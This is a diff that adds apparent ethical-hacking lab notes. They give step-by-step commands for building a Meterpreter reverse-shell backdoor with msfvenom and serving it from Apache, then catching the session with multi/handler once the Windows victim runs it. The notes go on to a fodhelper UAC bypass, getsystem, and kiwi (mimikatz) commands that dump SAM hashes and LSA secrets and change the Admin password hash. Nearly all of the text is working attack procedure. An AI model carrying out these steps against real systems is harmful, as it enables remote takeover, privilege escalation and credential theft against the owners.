@@ -19,3 +19,46 @@ sessions -i 1
 meterpreter> sysinfo
 meterpreter> pwd
 meterpreter> cat Secret.txt
+
+
+
+ parrot os: sudo su and cd to go to root directory
+  msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.1.13 LPORT=444 -f exe > /home/attacker/Desktop/backdoor.exe
+  
+  mkdir /var/www/html/share
+  chmod -R 755 /var/www/html/share
+  chown -R www-data:www-data /var/www/html/share
+  
+  cp /home/attacker/Desktop/backdoor.exe /var/www/html/share
+  service apache2 start
+
+  msfconsole
+  use exploit/multi/handler
+  set payload windows/meterpreter/reverse_tcp
+  set LHOST=10.10.1.13
+  set LPORT=444
+  run
+
+  Login to Windows Machine, http://10.10.1.13/share and run backdoor.exe file
+  
+  Comeback to Parrot OS:
+  meterpreter successfully connected with session 1 and prompt as 
+  meterpreter> 
+  type sysinfo # to know system information
+  type getuid  # to know logged in user
+   # to bypass Admin and to get root access
+  type background # to know the session ID, in this case 1
+  use exploit/windows/local/bypassuat_fodhelper
+  set session 1
+  show options
+  set LHOST 10.10.1.13
+  set TARGET 0
+  exploit
+  
+  getsystem -t 1 # to elevate privileges
+  getuid   # elevated privilege from Admin NT AUTHORITY\SYSTEM
+  load kiwi
+  help kiwi 
+  lsa_dump_sam   # to load NTLM hash of all users
+  lsa_dump_secrets  # 	to view LSA secrets login hashes
+  password_change -u Admin -n <NTLM hash of Admin acquired above> -P <new NTLM hash>
